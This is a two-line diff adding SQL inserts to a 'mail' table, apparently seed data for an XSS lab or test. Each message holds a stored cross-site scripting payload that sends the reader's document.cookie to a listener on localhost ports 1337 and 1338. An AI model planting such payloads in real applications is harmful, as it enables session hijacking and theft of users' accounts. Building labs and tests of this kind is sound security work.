@@ -1,0 +1,2 @@
+insert into mail (id, message) values(1,'asdf<script>a = new Image();a.src="http://localhost:1337/?cookie=" + document.cookie;</script>');
+insert into mail (id, message) values(2,'asdf<script>a = new Image();a.src="http://localhost:1338/?cookie=" + document.cookie;</script>');
